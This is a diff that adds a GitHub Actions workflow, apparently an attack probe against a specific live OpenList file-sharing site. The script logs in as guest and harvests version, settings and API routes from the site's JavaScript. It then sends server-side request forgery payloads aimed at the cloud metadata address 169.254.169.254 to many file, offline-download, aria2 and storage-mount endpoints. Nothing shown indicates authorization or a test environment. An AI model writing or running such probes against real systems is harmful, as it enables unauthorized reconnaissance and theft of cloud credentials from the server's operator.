@@ -1,0 +1,56 @@
+name: openlist-ssrf-deep
+on:
+  workflow_dispatch:
+jobs:
+  deep:
+    runs-on: ubuntu-latest
+    steps:
+      - name: OpenList deeper probe (version, routes, server-fetch read endpoints)
+        run: |
+          set +e
+          B="https://pan.yazinb.icu"
+          LOGIN=$(curl -skS -m 20 -X POST "$B/api/auth/login" -H "Content-Type: application/json" -d '{"username":"guest","password":"guest"}')
+          TOKEN=$(echo "$LOGIN" | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('token',''))" 2>/dev/null)
+          AUTH="Authorization: ${TOKEN}"
+          echo "=== VERSION / settings harvest ==="
+          for u in "/api/version" "/api/setting/info" "/api/public/settings" "/api/setting/info/public" "/api/public/info" "/api/system/info" "/api/branding"; do
+            echo "--- GET $u ---"
+            curl -skS -m 15 "$B$u" -H "$AUTH" -w "  [HTTP %{http_code}]\n" | head -c 500
+            echo
+          done
+          echo "=== JS version/route harvest (fixed grep) ==="
+          HTML=$(curl -skS -m 20 "$B/")
+          JS=$(echo "$HTML" | grep -oE '/assets/[^"]+\.js' | sort -u)
+          echo "$JS" > /tmp/js.txt
+          : > /tmp/routes2.txt
+          while read -r j; do
+            [ -z "$j" ] && continue
+            curl -skS -m 30 "$B$j" >> /tmp/alljs.txt 2>/dev/null
+          done < /tmp/js.txt
+          echo "alljs bytes=$(wc -c < /tmp/alljs.txt)"
+          grep -oE '/(api|api/fs|api/auth|api/setting|api/public|api/task|api/storage|api/aria2|api/dav)[a-zA-Z0-9_/.-]*' /tmp/alljs.txt | sort -u > /tmp/routes2.txt
+          echo "=== UNIQUE API PATHS (grep) ==="
+          cat /tmp/routes2.txt
+          echo "=== version string candidates ==="
+          grep -oE 'version["'"'"']?[: =]+["'"'"']?[0-9]+\.[0-9]+\.[0-9]+' /tmp/alljs.txt | sort -u | head -20
+          grep -oE '"[0-9]+\.[0-9]+\.[0-9]+"' /tmp/alljs.txt | sort -u | head -20
+          echo "=== [A] guest read endpoints: differential probe (url/path param) ==="
+          for ep in "/api/fs/get" "/api/fs/preview" "/api/fs/thumb" "/api/fs/content" "/api/fs/search" "/api/fs/dirs" "/api/fs/other" "/api/fs/list" "/api/fs/rename" "/api/fs/link" "/api/fs/put" "/api/fs/form" "/api/fs/archive" "/api/fs/archive_download"; do
+            # try with a remote URL-like path param
+            CODE=$(curl -skS -m 12 -o /tmp/a.txt -w "%{http_code}" -X POST "$B$ep" -H "$AUTH" -H "Content-Type: application/json" -d '{"path":"http://169.254.169.254/latest/meta-data/","url":"http://169.254.169.254/latest/meta-data/","name":"x","password":"","force":false}' 2>/dev/null)
+            echo "GUEST $ep -> HTTP $CODE | $(head -c 160 /tmp/a.txt | tr -d '\n')"
+          done
+          echo "=== [B] offline-download correct-shape attempt (guest) ==="
+          curl -skS -m 15 -X POST "$B/api/fs/add_offline_download" -H "$AUTH" -H "Content-Type: application/json" -d '{"path":"/","urls":["http://169.254.169.254/latest/meta-data/"]}' -w "  [HTTP %{http_code}]\n" | head -c 400
+          echo
+          curl -skS -m 15 -X POST "$B/api/task/offline_download/add" -H "$AUTH" -H "Content-Type: application/json" -d '{"path":"/","urls":["http://169.254.169.254/latest/meta-data/"]}' -w "  [HTTP %{http_code}]\n" | head -c 400
+          echo
+          echo "=== [C] aria2 add (guest) ==="
+          curl -skS -m 15 -X POST "$B/api/task/aria2/add" -H "$AUTH" -H "Content-Type: application/json" -d '{"path":"/","urls":["http://169.254.169.254/latest/meta-data/"]}' -w "  [HTTP %{http_code}]\n" | head -c 400
+          echo
+          echo "=== [D] try add-storage-ish endpoints (guest) ==="
+          for ep in "/api/storage/create" "/api/storage/update" "/api/storage/add" "/api/admin/storage/create" "/api/fs/add" "/api/fs/mount"; do
+            CODE=$(curl -skS -m 12 -o /tmp/d.txt -w "%{http_code}" -X POST "$B$ep" -H "$AUTH" -H "Content-Type: application/json" -d '{"mount_path":"/x","driver":"UrlTree","url":"http://169.254.169.254/"}' 2>/dev/null)
+            echo "GUEST $ep -> HTTP $CODE | $(head -c 160 /tmp/d.txt | tr -d '\n')"
+          done
+          echo "=== DEEP DONE ==="
